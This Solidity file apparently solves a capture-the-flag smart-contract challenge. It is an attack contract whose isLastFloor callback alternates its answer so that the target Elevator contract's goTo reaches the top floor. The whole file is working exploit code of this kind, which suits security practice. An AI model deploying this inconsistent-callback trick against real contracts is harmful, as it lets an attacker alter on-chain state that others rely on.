// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Define the Building interface to match the challenge
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

// Define the Elevator interface to interact with the vulnerable contract
interface Elevator {
    function goTo(uint256 _floor) external;
}

contract AttackElevator is Building {
    bool public toggle = true;
    Elevator public elevatorContract;

    // Initialize with the Elevator contract address
    constructor(address _elevatorAddress) {
        elevatorContract = Elevator(_elevatorAddress);
    }

    // Implement the isLastFloor function to manipulate the behavior
    function isLastFloor(uint256) external override returns (bool) {
        // Return false on the first call, then true on the next
        toggle = !toggle;
        return toggle;
    }

    // Attack function to go to the top floor
    function attack(uint256 _floor) public {
        elevatorContract.goTo(_floor);
    }
}
